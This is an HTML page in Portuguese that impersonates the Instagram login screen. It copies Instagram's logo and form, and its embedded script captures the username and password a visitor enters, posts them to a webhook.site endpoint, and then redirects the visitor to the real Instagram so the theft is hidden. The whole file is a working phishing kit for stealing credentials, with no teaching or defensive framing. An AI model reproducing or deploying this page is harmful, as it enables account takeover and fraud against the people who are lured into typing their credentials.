<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="insta-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo">
        <form id="login-form">
            <input type="text" id="username" placeholder="Telefone, nome de usuÃ¡rio ou email" required>
            <input type="password" id="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
        <p class="forgot">Esqueceu a senha?</p>
    </div>

    <script>
        const form = document.getElementById("login-form");
        form.addEventListener("submit", function(e) {
            e.preventDefault();

            const data = {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value
            };

            fetch("https://webhook.site/5f05847b-9b72-4cd1-bdd7-fa2a889734e6", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });

            // Redireciona pro Instagram real
            window.location.href = "https://instagram.com";
        });
    </script>
</body>
</html>
